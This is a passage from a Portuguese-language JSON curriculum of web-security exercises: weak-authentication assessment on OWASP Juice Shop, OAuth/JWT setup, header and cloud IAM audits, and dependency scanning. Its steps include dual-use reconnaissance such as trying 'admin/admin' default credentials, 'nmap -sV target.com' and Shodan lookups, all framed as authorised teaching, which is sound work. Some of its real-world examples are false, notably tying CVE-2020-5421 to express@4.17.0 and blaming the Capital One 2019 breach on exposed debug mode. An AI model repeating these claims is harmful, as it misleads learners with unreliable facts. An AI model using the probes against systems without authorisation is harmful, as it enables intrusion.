                                    "Use ferramentas como Burp Suite Community para interceptar requests e simular falhas.",
                                    "Documente evidências com screenshots ou trechos de código."
                                  ],
                                  "verification": "Liste pelo menos 3 evidências de autenticação fraca encontradas no exemplo.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "OWASP Juice Shop (app vulnerável demo)",
                                    "Burp Suite Community Edition",
                                    "Editor de código como VS Code"
                                  ],
                                  "tips": "Comece pelo login: teste credenciais default como 'admin/admin'.",
                                  "learningObjective": "Localizar indicadores técnicos de autenticação fraca em um sistema realista.",
                                  "commonMistakes": [
                                    "Focar só em senhas, ignorando sessões e MFA.",
                                    "Não testar ativamente com ferramentas."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar impactos e vulnerabilidades associadas",
                                  "subSteps": [
                                    "Descreva hijacking de contas: atacante usa senha default para acessar dados sensíveis.",
                                    "Explique escalada de privilégios via sessões persistentes sem timeout.",
                                    "Simule cenários: perda financeira em e-commerce ou vazamento de PII sem MFA.",
                                    "Calcule severidade usando CVSS (ex: alta confidencialidade impactada).",
                                    "Compare com casos reais como breaches OWASP."
                                  ],
                                  "verification": "Elabore um relatório com 3 impactos detalhados e suas probabilidades.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Matriz CVSS online",
                                    "Relatórios de breaches (ex: Verizon DBIR)"
                                  ],
                                  "tips": "Pense em cadeia: autenticação fraca → acesso → exfiltração de dados.",
                                  "learningObjective": "Mapear riscos de autenticação fraca a impactos concretos no negócio.",
                                  "commonMistakes": [
                                    "Subestimar sessões sem timeout como 'apenas inconveniência'.",
                                    "Não ligar a impactos regulatórios como LGPD."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar riscos de forma estruturada e propor verificações iniciais",
                                  "subSteps": [
                                    "Crie uma checklist de avaliação: senha default? Timeout <30min? MFA obrigatório?",
                                    "Atribua scores de risco (baixo/médio/alto) baseado em exposição (público/interno).",
                                    "Simule relatório: priorize riscos com exemplos de hijacking.",
                                    "Discuta mitigações básicas: hash senhas, session.invalidate(), integrar MFA.",
                                    "Valide com peer review ou auto-teste."
                                  ],
                                  "verification": "Produza uma avaliação completa com scores e recomendações.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Template de checklist OWASP ASVS",
                                    "Ferramenta de risco como OWASP Risk Rating"
                                  ],
                                  "tips": "Use escala qualitativa se não souber CVSS: foque em likelihood x impact.",
                                  "learningObjective": "Realizar uma avaliação holística de riscos de autenticação fraca.",
                                  "commonMistakes": [
                                    "Avaliar isolado, sem contexto do app inteiro.",
                                    "Propor mitigações avançadas sem base."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um app de e-commerce vulnerável (como OWASP Juice Shop), identifique senhas default no admin panel, sessões que duram 7 dias sem timeout e login sem MFA. Avalie: risco de hijacking permite roubo de cartões de clientes, levando a perdas de R$100k+.",
                              "finalVerifications": [
                                "Lista completa de senhas padrão, sessões sem timeout e ausência de MFA identificadas.",
                                "Explicação clara de pelo menos 3 impactos, incluindo hijacking de contas.",
                                "Checklist de avaliação com scores de risco atribuídos.",
                                "Relatório com evidências e exemplos OWASP.",
                                "Propostas iniciais de mitigações validadas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de todos os 3 tipos de autenticação fraca (100%).",
                                "Profundidade na análise de impactos com exemplos reais (mínimo 3).",
                                "Completude da checklist e scores de risco lógicos.",
                                "Uso correto de ferramentas e evidências documentadas.",
                                "Clareza e estrutura no relatório final.",
                                "Conexão explícita com OWASP Top 10."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento de Aplicações Web: Integração de bibliotecas de auth seguras (ex: OAuth).",
                                "Redes e Sistemas: Gerenciamento de sessões em protocolos HTTP/HTTPS.",
                                "Ética e Governança: Conformidade com LGPD e impactos de privacidade.",
                                "Análise de Riscos: Metodologias como STRIDE ou CVSS."
                              ],
                              "realWorldApplication": "Na brecha do Twitter (2020), autenticação fraca em ferramentas internas permitiu hijacking de contas de alto perfil, afetando confiança global e resultando em multas milionárias; avaliação precoce previne tais incidentes em apps corporativos."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.3.3",
                            "name": "Configurar autenticação segura",
                            "description": "Implementar OAuth 2.0, JWT com validação e rate limiting, seguindo guidelines de Purewal em 'Learning Web App Development'.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Fundamentos de OAuth 2.0 e JWT",
                                  "subSteps": [
                                    "Estude o fluxo de autorização OAuth 2.0 (Authorization Code Grant).",
                                    "Aprenda a estrutura de um token JWT (header, payload, signature).",
                                    "Revise guidelines de segurança do livro 'Learning Web App Development' de Purewal, focando em autenticação stateless.",
                                    "Identifique diferenças entre autenticação e autorização.",
                                    "Liste vetores de ataque comuns como token leakage e replay attacks."
                                  ],
                                  "verification": "Resuma em um diagrama o fluxo OAuth 2.0 e decode um JWT de exemplo usando jwt.io.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Livro 'Learning Web App Development' de Purewal (capítulos relevantes)",
                                    "Site jwt.io",
                                    "Documentação OAuth 2.0 RFC 6749"
                                  ],
                                  "tips": "Use diagramas visuais para mapear fluxos; evite memorizar, foque em compreensão.",
                                  "learningObjective": "Compreender os conceitos teóricos de OAuth 2.0 e JWT para implementação segura.",
                                  "commonMistakes": [
                                    "Confundir OAuth com autenticação direta",
                                    "Ignorar expiração de tokens",
                                    "Não validar signatures JWT"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Provedor OAuth 2.0",
                                  "subSteps": [
                                    "Registre uma aplicação no provedor OAuth (ex: Google ou Auth0).",
                                    "Configure client ID, secret e URIs de redirect.",
                                    "Implemente endpoint de login que redireciona para o provedor.",
                                    "Capture e valide o code de autorização no callback.",
                                    "Troque o code por access token usando POST para token endpoint."
                                  ],
                                  "verification": "Teste o fluxo: login deve redirecionar, callback deve retornar token válido.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Conta em Auth0 ou Google Developer Console",
                                    "Node.js/Express ou framework similar",
                                    "Postman para testar endpoints"
                                  ],
                                  "tips": "Use HTTPS em todos os endpoints; armazene secrets em variáveis de ambiente.",
                                  "learningObjective": "Implementar integração básica com provedor OAuth 2.0.",
                                  "commonMistakes": [
                                    "Expor client secret no frontend",
                                    "Não validar state parameter",
                                    "Ignorar PKCE para public clients"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar JWT com Validação Robusta",
                                  "subSteps": [
                                    "Gere JWTs assinados com chaves assimétricas (RS256).",
                                    "Configure middleware para validar JWT em rotas protegidas.",
                                    "Valide claims: iss, aud, exp, iat e sub.",
                                    "Implemente refresh tokens com rotação.",
                                    "Adicione validação de signature e blacklist para tokens revocados."
                                  ],
                                  "verification": "Envie requisições com JWT inválido/expirado; deve rejeitar com 401.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Biblioteca jsonwebtoken (Node.js)",
                                    "Chaves RSA geradas via openssl",
                                    "Documentação Purewal sobre JWT seguro"
                                  ],
                                  "tips": "Nunca confie em payload sem validar signature; use bibliotecas auditadas.",
                                  "learningObjective": "Criar e validar tokens JWT seguindo melhores práticas de segurança.",
                                  "commonMistakes": [
                                    "Usar chaves simétricas fracas",
                                    "Não checar expiração",
                                    "Armazenar JWTs em localStorage sem HttpOnly"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Adicionar Rate Limiting e Proteções Adicionais",
                                  "subSteps": [
                                    "Instale e configure middleware de rate limiting (ex: express-rate-limit).",
                                    "Aplique limites por IP e por usuário autenticado em endpoints sensíveis.",
                                    "Implemente proteção contra brute force com lockout temporário.",
                                    "Adicione headers de segurança (CORS, CSP).",
                                    "Logue tentativas de autenticação falhas para monitoramento."
                                  ],
                                  "verification": "Simule múltiplas requisições; exceder limite deve retornar 429.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "express-rate-limit npm package",
                                    "Winston para logging",
                                    "Guidelines OWASP para rate limiting"
                                  ],
                                  "tips": "Combine IP e user ID para limites granulares; configure burst e windowMs adequadamente.",
                                  "learningObjective": "Proteger endpoints contra abusos com rate limiting.",
                                  "commonMistakes": [
                                    "Rate limit só em login, ignorando outras rotas",
                                    "Limites muito altos",
                                    "Não persistir contadores em Redis"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar e Auditar a Implementação Completa",
                                  "subSteps": [
                                    "Execute testes unitários para geração/validação JWT.",
                                    "Teste integração end-to-end com ferramentas como Cypress.",
                                    "Audite com OWASP ZAP ou similar para vulnerabilidades.",
                                    "Verifique conformidade com guidelines de Purewal.",
                                    "Documente a configuração em README."
                                  ],
                                  "verification": "Todos os testes passam; scan de segurança sem critical/high vulns.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Jest/Mocha para testes",
                                    "OWASP ZAP",
                                    "Cypress para E2E"
                                  ],
                                  "tips": "Automatize testes em CI/CD; revise logs para anomalias.",
                                  "learningObjective": "Validar a autenticação segura contra ataques reais.",
                                  "commonMistakes": [
                                    "Testar só casos felizes",
                                    "Ignorar testes de race conditions",
                                    "Não auditar third-party libs"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma API de e-commerce com Node.js/Express, configure OAuth via Google para login de usuários, use JWT para sessões stateless em carrinho de compras protegido, aplique rate limit de 5 tentativas/minuto em /login, prevenindo brute force.",
                              "finalVerifications": [
                                "Fluxo OAuth completa sem vazamento de tokens.",
                                "JWTs inválidos/expirados rejeitados em todas rotas protegidas.",
                                "Rate limiting ativa: 429 após limite excedido.",
                                "Logs capturam falhas de autenticação.",
                                "Scan OWASP ZAP sem vulns de autenticação.",
                                "Refresh token rotaciona corretamente."
                              ],
                              "assessmentCriteria": [
                                "Código segue guidelines Purewal: 100% conformidade.",
                                "Segurança: sem storage inseguro de tokens (localStorage).",
                                "Funcionalidade: autenticação end-to-end funciona.",
                                "Performance: rate limiting não afeta usuários legítimos.",
                                "Documentação: README explica setup e testes.",
                                "Testes: cobertura >80% em autenticação."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Uso de assinaturas digitais (RS256).",
                                "Redes: HTTPS e headers de segurança (CORS, HSTS).",
                                "Banco de Dados: Armazenamento seguro de refresh tokens hashed.",
                                "DevOps: Integração com Redis para rate limiting persistente.",
                                "Ética: Conformidade GDPR em logging de autenticação."
                              ],
                              "realWorldApplication": "Em plataformas como Netflix ou Spotify, onde OAuth 2.0 com Google/Facebook permite login seguro, JWT gerencia sessões em microservices, e rate limiting previne DDoS em endpoints de autenticação, reduzindo riscos OWASP A07:2021."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.3.4",
                        "name": "Configuração Insegura e Componentes Vulneráveis",
                        "description": "Análise de A05:2021 Security Misconfiguration e A06:2021 Vulnerable and Outdated Components, comuns em aplicações web modernas.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.3.4.1",
                            "name": "Auditar configurações de segurança",
                            "description": "Verificar headers ausentes (HSTS, X-Frame-Options), permissões excessivas em cloud (SaaS per Fox & Patterson) e defaults inseguros.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar ambiente e auditar headers HTTP de segurança",
                                  "subSteps": [
                                    "Instale ferramentas como curl, browser dev tools (Chrome/Firefox) ou OWASP ZAP.",
                                    "Acesse a aplicação alvo via HTTPS e capture o tráfego HTTP.",
                                    "Execute comandos curl para headers específicos: curl -I https://target.com | grep -i hsts.",
                                    "Verifique presença de HSTS (Strict-Transport-Security), X-Frame-Options, X-Content-Type-Options.",
                                    "Registre headers ausentes ou mal configurados em um relatório inicial."
                                  ],
                                  "verification": "Lista de headers capturados confirmada com pelo menos 80% de cobertura dos principais (HSTS, X-Frame-Options, etc.).",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Browser com dev tools",
                                    "curl instalado",
                                    "OWASP ZAP ou Burp Suite Community",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Use -v flag no curl para verbose output; teste em diferentes endpoints (login, API).",
                                  "learningObjective": "Identificar e documentar headers de segurança HTTP ausentes ou incorretos.",
                                  "commonMistakes": [
                                    "Ignorar redirecionamentos HTTP->HTTPS que mascaram headers",
                                    "Não testar subdomínios",
                                    "Confundir headers com CSP (Content-Security-Policy)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Auditar permissões excessivas em ambientes cloud SaaS",
                                  "subSteps": [
                                    "Acesse o console do provedor cloud (ex: AWS, Azure, GCP) com credenciais de auditoria.",
                                    "Liste recursos IAM/roles: foque em SaaS como S3 buckets, databases (per Fox & Patterson guidelines).",
                                    "Verifique políticas: identifique permissões * (wildcard) excessivas, public access enabled.",
                                    "Use ferramentas como AWS IAM Access Analyzer ou PACU para scans automatizados.",
                                    "Documente riscos: ex. bucket público com dados sensíveis."
                                  ],
                                  "verification": "Relatório com lista de permissões excessivas e suas impactos potenciais.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Acesso read-only ao console cloud",
                                    "AWS CLI ou gsutil instalado",
                                    "Ferramentas: Prowler, ScoutSuite",
                                    "Guia Fox & Patterson para SaaS perms"
                                  ],
                                  "tips": "Comece por buckets storage e databases; filtre por 'public' ou 'allUsers'.",
                                  "learningObjective": "Detectar e classificar permissões IAM excessivas em SaaS cloud.",
                                  "commonMistakes": [
                                    "Não diferenciar permissões de serviço vs usuário",
                                    "Ignorar service accounts",
                                    "Esquecer de checar cross-account access"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar e auditar configurações default inseguras",
                                  "subSteps": [
                                    "Mapeie serviços expostos: ports abertas (nmap -sV target.com), software versions.",
                                    "Verifique defaults: senhas admin padrão (admin/admin), services desabilitados não configurados.",
                                    "Scan com ferramentas: Nessus, OpenVAS para known defaults inseguros.",
                                    "Cheque containers/Docker: images não atualizadas, volumes montados inseguros.",
                                    "Registre CVEs associadas a defaults (ex. Jenkins default creds)."
                                  ],
                                  "verification": "Inventário de 5+ defaults inseguros identificados com evidências (screenshots/logs).",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Nmap instalado",
                                    "OpenVAS ou Nikto",
                                    "Docker inspect se aplicável",
                                    "Lista de defaults comuns OWASP"
                                  ],
                                  "tips": "Use shodan.io para recon inicial; priorize ports 22,80,443,8080.",
                                  "learningObjective": "Reconhecer padrões de configurações default que expõem vulnerabilidades.",
                                  "commonMistakes": [
                                    "Assumir que updates automáticos eliminam defaults",
                                    "Não testar credenciais padrão",
                                    "Ignorar appliances IoT/embedded"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Compilar relatório, priorizar e validar remediações",
                                  "subSteps": [
                                    "Agrupe achados por categoria (headers, cloud, defaults) e risco (CVSS score).",
                                    "Proponha fixes: ex. adicionar header HSTS via nginx.conf, tighten IAM policies.",
                                    "Re-teste após simular correções em ambiente staging.",
                                    "Gere relatório em Markdown/PDF com evidências e métricas de cobertura.",
                                    "Discuta com stakeholder simulado para feedback."
                                  ],
                                  "verification": "Relatório final aprovado com todas vulnerabilidades endereçadas ou mitigadas.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Template de relatório OWASP",
                                    "Markdown editor (Typora/VS Code)",
                                    "Ambiente staging para re-test"
                                  ],
                                  "tips": "Use matriz de risco (impacto x likelihood); inclua screenshots before/after.",
                                  "learningObjective": "Sintetizar achados de auditoria em ações acionáveis e verificáveis.",
                                  "commonMistakes": [
                                    "Relatório vago sem evidências",
                                    "Não priorizar por risco negócio",
                                    "Esquecer re-test de fixes"
                                  ]
                                }
                              ],
                              "practicalExample": "Audite o site demoapp.example.com hospedado em AWS: Use curl para confirmar ausência de HSTS (curl -I | grep Strict), cheque S3 bucket 'demo-bucket' com política pública (*Principal), identifique Nginx rodando com config default expondo /server-status. Relate e simule fix: adicione header, remova public access, altere senha admin.",
                              "finalVerifications": [
                                "Todos headers críticos (HSTS, X-Frame-Options) presentes ou corretamente ausentes reportados.",
                                "Permissões cloud revisadas: zero wildcards excessivos em recursos sensíveis.",
                                "Defaults inseguros eliminados ou mitigados em 100% dos casos identificados.",
                                "Relatório cobre OWASP A05:2021 com evidências visuais.",
                                "Re-scan pós-auditoria mostra redução de riscos >80%.",
                                "Priorização alinhada com impacto negócio (ex. dados sensíveis primeiro)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação: 90%+ das vulnerabilidades reais detectadas.",
                                "Cobertura completa: todos aspectos (headers, cloud, defaults) abordados.",
                                "Qualidade do relatório: claro, acionável, com métricas e evidências.",
                                "Profundidade técnica: uso correto de ferramentas e interpretação de outputs.",
                                "Criatividade em remediações: soluções práticas e escaláveis propostas.",
                                "Tempo gestão: conclusão dentro do estimado total (4-5 horas)."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento Web: Integração de headers em código frontend/backend.",
                                "Administração de Sistemas: Gerência de IAM e hardening de servers.",
                                "Gestão de Projetos TI: Ciclo de auditoria e compliance (GDPR/SOX).",
                                "Análise de Dados: Uso de logs e métricas para priorização de riscos.",
                                "Ética e Governança: Responsabilidade em relatar vulnerabilidades."
                              ],
                              "realWorldApplication": "Em bancos digitais como Nubank ou e-commerces como Amazon, auditorias regulares de configs previnem breaches milionários: HSTS evita MITM, permissões tight IAM bloqueiam vazamentos S3 (como Capital One 2019), defaults fixados reduzem ataques automatizados em 70%."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.4.2",
                            "name": "Gerenciar dependências vulneráveis",
                            "description": "Usar ferramentas como OWASP Dependency-Check ou Snyk para escanear e atualizar bibliotecas de terceiros.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalar e configurar a ferramenta de análise",
                                  "subSteps": [
                                    "Escolher uma ferramenta como Snyk CLI ou OWASP Dependency-Check com base no ecossistema do projeto (ex: Node.js para Snyk).",
                                    "Instalar via gerenciador de pacotes: `npm install -g snyk` ou baixar Dependency-Check do site OWASP.",
                                    "Criar conta gratuita no Snyk (se aplicável) e autenticar com `snyk auth`.",
                                    "Verificar instalação executando `snyk --version` ou `dependency-check --version`.",
                                    "Configurar arquivo de projeto (ex: package.json para Node.js)."
                                  ],
                                  "verification": "Comando de versão executa sem erros e autenticação é confirmada.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Node.js instalado",
                                    "Projeto de exemplo com package.json",
                                    "Conexão à internet"
                                  ],
                                  "tips": "Prefira Snyk para projetos JavaScript por sua integração nativa com npm/yarn.",
                                  "learningObjective": "Configurar corretamente ferramentas de escaneamento de dependências vulneráveis.",
                                  "commonMistakes": [
                                    "Esquecer de autenticar a CLI",
                                    "Instalar em diretório sem permissões",
                                    "Usar versão desatualizada da ferramenta"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Executar o escaneamento inicial do projeto",
                                  "subSteps": [
                                    "Navegar ao diretório raiz do projeto via terminal.",
                                    "Executar `snyk test` ou `dependency-check --scan . --format JSON`.",
                                    "Capturar o relatório gerado (vulnerabilidades por severidade: crítica, alta, média, baixa).",
                                    "Salvar o output em arquivo para análise posterior (ex: `snyk test --json > scan.json`).",
                                    "Interpretar métricas iniciais como número de dependências vulneráveis."
                                  ],
                                  "verification": "Relatório de scan é gerado e lista vulnerabilidades detectadas.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Terminal/CLI",
                                    "Projeto com dependências conhecidas (ex: express^4.17.0)"
                                  ],
                                  "tips": "Execute em modo JSON para facilitar parsing automatizado.",
                                  "learningObjective": "Realizar escaneamento completo e capturar resultados de forma estruturada.",
                                  "commonMistakes": [
                                    "Rodar scan em diretório errado",
                                    "Ignorar dependências transitivas",
                                    "Não salvar output para histórico"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar e priorizar vulnerabilidades",
                                  "subSteps": [
                                    "Abrir o relatório e classificar por CVSS score (crítica >7.0 priorizar).",
                                    "Identificar dependências afetadas e CVEs associadas (ex: CVE-2020-XXXX).",
                                    "Verificar se há patches disponíveis via `snyk test --update` ou sites como snyk.io/advisor.",
                                    "Avaliar impacto: exploitability, affected versions e business risk.",
                                    "Criar lista priorizada de 3-5 vulnerabilidades críticas para remediação."
                                  ],
                                  "verification": "Lista priorizada documentada com justificativas e scores CVSS.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Relatório JSON/HTML do scan",
                                    "Navegador para consultar NVD ou Snyk database"
                                  ],
                                  "tips": "Use filtros como `--severity=high,critical` para focar em riscos reais.",
                                  "learningObjective": "Interpretar relatórios de segurança e priorizar remediações baseadas em risco.",
                                  "commonMistakes": [
                                    "Priorizar por nome em vez de severidade",
                                    "Ignorar false positives sem verificação",
                                    "Não considerar dependências indiretas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Remediar, reescanear e documentar",
                                  "subSteps": [
                                    "Atualizar dependências vulneráveis: `npm update` ou `snyk wizard` para guiado.",
                                    "Aplicar mitigações se update não possível (ex: overrides no package.json).",
                                    "Reexecutar scan para validar correções: `snyk test --pass-fail`.",
                                    "Documentar mudanças em CHANGELOG ou README (versões antigas/novas, CVEs fixados).",
                                    "Configurar monitoramento contínuo: `snyk monitor` ou GitHub Actions."
                                  ],
                                  "verification": "Novo scan mostra zero vulnerabilidades críticas e pass-fail ok.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Editor de código",
                                    "Git para commit das mudanças"
                                  ],
                                  "tips": "Teste a aplicação após updates para evitar breaking changes.",
                                  "learningObjective": "Executar remediações eficazes e estabelecer processos de monitoramento contínuo.",
                                  "commonMistakes": [
                                    "Atualizar sem testes",
                                    "Não versionar mudanças",
                                    "Esquecer de reescanear"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um projeto Node.js com 'express@4.17.0' (vulnerável a CVE-2020-5421), execute `snyk test` que detecta o issue; priorize, atualize para 'express@4.18.2' via `npm update express`, reescanne e confirme fix com relatório limpo.",
                              "finalVerifications": [
                                "Scan final sem vulnerabilidades críticas ou altas.",
                                "Todas dependências atualizadas com versões seguras documentadas.",
                                "Processo de remediação testado em ambiente de staging.",
                                "Monitoramento contínuo configurado (ex: Snyk monitor ativo).",
                                "Relatório de antes/depois salvo no repositório.",
                                "Aplicação roda sem erros pós-updates."
                              ],
                              "assessmentCriteria": [
                                "Configuração correta da ferramenta demonstrada.",
                                "Interpretação precisa de relatórios com priorização por risco.",
                                "Remediações aplicadas com sucesso e verificadas.",
                                "Documentação completa de ações e lições aprendidas.",
                                "Uso eficiente de tempo e recursos sem erros comuns.",
                                "Capacidade de integrar scan em workflow de desenvolvimento."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento de Software: Integração em pipelines CI/CD.",
                                "Gestão de Projetos: Avaliação de riscos e priorização de tarefas.",
                                "Ética e Governança em TI: Conformidade com standards como OWASP.",
                                "DevOps/SecOps: Automatização de segurança em fluxos de deploy.",
                                "Análise de Dados: Interpretação de métricas de vulnerabilidades."
                              ],
                              "realWorldApplication": "Em empresas como bancos ou e-commerces, gerenciar dependências previne breaches como o Equifax (2017, vulnerabilidade em Apache Struts), reduzindo custos de incidentes e garantindo conformidade com regulamentações como LGPD/GDPR."
                            },
                            "estimatedTime": "0.75 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.4.3",
                            "name": "Corrigir misconfigurations comuns",
                            "description": "Aplicar hardening como desabilitar debug mode em produção e usar SBOM para rastrear componentes.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar misconfigurations comuns em aplicações",
                                  "subSteps": [
                                    "Revisar documentação OWASP Top 10 para Configuração Insegura e Componentes Vulneráveis.",
                                    "Auditar código e configurações de ambiente de produção para flags como debug mode ativado.",
                                    "Listar dependências de terceiros usando ferramentas como npm list ou pip list.",
                                    "Identificar exposições como portas desnecessárias abertas ou headers de segurança ausentes.",
                                    "Documentar todas as misconfigurations encontradas em um relatório inicial."
                                  ],
                                  "verification": "Lista completa de misconfigurations identificadas com evidências (screenshots ou logs).",
                                  "estimatedTime": "2 horas",
                                  "materials": "Documentação OWASP, ferramentas de auditoria como npm audit ou pip-audit, acesso ao código-fonte.",
                                  "tips": "Comece pelo ambiente de staging para simular produção sem riscos.",
                                  "learningObjective": "Compreender os impactos de misconfigurations comuns como debug mode e componentes desatualizados.",
                                  "commonMistakes": "Ignorar configurações de ambiente variáveis ou focar apenas em código sem checar runtime."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Desabilitar debug mode e aplicar hardening básico",
                                  "subSteps": [
                                    "Localizar configurações de debug em arquivos como .env, config.js ou application.properties.",
                                    "Definir variáveis de ambiente como DEBUG=false ou APP_ENV=production.",
                                    "Remover ou comentar linhas de código que expõem informações sensíveis em logs de debug.",
                                    "Configurar headers de segurança como X-Frame-Options e Content-Security-Policy via middleware.",
                                    "Reiniciar a aplicação e testar em ambiente isolado."
                                  ],
                                  "verification": "Logs de aplicação sem informações de debug e teste de endpoint sensível retorna erro 404/403.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": "Editor de código (VS Code), servidor local (Docker), documentação da framework usada (ex: Express.js).",
                                  "tips": "Use git para versionar mudanças e crie um branch específico para hardening.",
                                  "learningObjective": "Aplicar técnicas de hardening para eliminar exposições de debug em produção.",
                                  "commonMistakes": "Esquecer de atualizar todas as instâncias (dev, staging, prod) ou deixar overrides em código."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Gerar e integrar SBOM para rastreamento de componentes",
                                  "subSteps": [
                                    "Instalar ferramenta de SBOM como Syft ou CycloneDX para a linguagem da aplicação.",
                                    "Executar geração de SBOM: syft packages . -o cyclonedx-json > sbom.json.",
                                    "Analisar SBOM para vulnerabilidades usando ferramentas como Grype ou Dependency-Track.",
                                    "Integrar SBOM no pipeline CI/CD para geração automática em builds.",
                                    "Atualizar dependências vulneráveis e regenerar SBOM."
                                  ],
                                  "verification": "Arquivo SBOM.json gerado com lista completa de componentes e relatório de vulnerabilidades zerado.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": "Syft/Grype (instalados via brew ou Docker), pipeline CI/CD (GitHub Actions ou Jenkins).",
                                  "tips": "Armazene SBOM em repositório público para conformidade SLSA ou SPDX.",
                                  "learningObjective": "Criar e utilizar SBOM para visibilidade e gerenciamento de riscos em componentes de terceiros.",
                                  "commonMistakes": "Gerar SBOM apenas uma vez sem automação ou ignorar dependências transitivas."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Auditar e validar configurações corrigidas",
                                  "subSteps": [
                                    "Executar scans automatizados com ferramentas como OWASP ZAP ou Trivy para configs e componentes.",
                                    "Realizar testes manuais: tentar acessar endpoints de debug e verificar SBOM contra CVEs recentes.",
                                    "Documentar políticas de hardening em README ou wiki do projeto.",
                                    "Simular deploy em produção e monitorar logs por 30 minutos.",
                                    "Criar checklist para auditorias futuras."
                                  ],
                                  "verification": "Relatório de scan sem misconfigurations críticas e deploy bem-sucedido sem erros de segurança.",
                                  "estimatedTime": "1 hora",
                                  "materials": "OWASP ZAP, Trivy, logs de aplicação (ELK stack ou similar).",
                                  "tips": "Automatize scans em CI/CD para detecção contínua.",
                                  "learningObjective": "Validar efetividade das correções através de auditorias e testes.",
                                  "commonMistakes": "Não testar em ambiente realista ou pular verificações pós-deploy."
                                }
                              ],
                              "practicalExample": "Em uma aplicação Node.js/Express em produção, identifique DEBUG=true no .env, desabilite-o definindo NODE_ENV=production, gere SBOM com syft packages app/ -o json > sbom.json, analise com grype sbom.json, e integre no GitHub Actions para scans automáticos, prevenindo vazamento de stack traces em erros.",
                              "finalVerifications": [
                                "Debug mode desabilitado: nenhum log sensível exposto em erros HTTP 500.",
                                "SBOM gerado e validado: todas dependências listadas sem CVEs críticas.",
                                "Headers de segurança presentes: verificados via curl -I.",
                                "Scan de vulnerabilidades passa: zero misconfigurations em Trivy/OWASP ZAP.",
                                "Pipeline CI/CD atualizado: SBOM gerado em cada build.",
                                "Documentação atualizada: checklist de hardening no README."
                              ],
                              "assessmentCriteria": [
                                "Identificação precisa de pelo menos 5 misconfigurations comuns.",
                                "Implementação correta de hardening sem introduzir bugs.",
                                "SBOM completo rastreando 100% das dependências.",
                                "Verificações finais passam em todos os testes automatizados.",
                                "Relatório claro com evidências e lições aprendidas.",
                                "Tempo dentro do estimado com qualidade alta."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento de Software: Integração em ciclos de DevSecOps.",
                                "Administração de Sistemas: Configurações de servidores e ambientes.",
                                "Gestão de Projetos: Auditorias e conformidade regulatória (GDPR, LGPD).",
                                "Análise de Dados: Monitoramento de logs e métricas de segurança."
                              ],
                              "realWorldApplication": "Em breaches como o da Capital One (2019), misconfigurations como debug exposto permitiram acesso não autorizado; usando SBOM, empresas como Google e Microsoft rastreiam componentes para patches rápidos, reduzindo tempo de exposição a zero-day vulnerabilities em supply chain attacks."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.5.4",
                    "name": "Autenticação e Autorização Segura",
                    "description": "Mecanismos para verificar identidade de usuários e controlar acesso a recursos.",
                    "individualConcepts": [
                      {
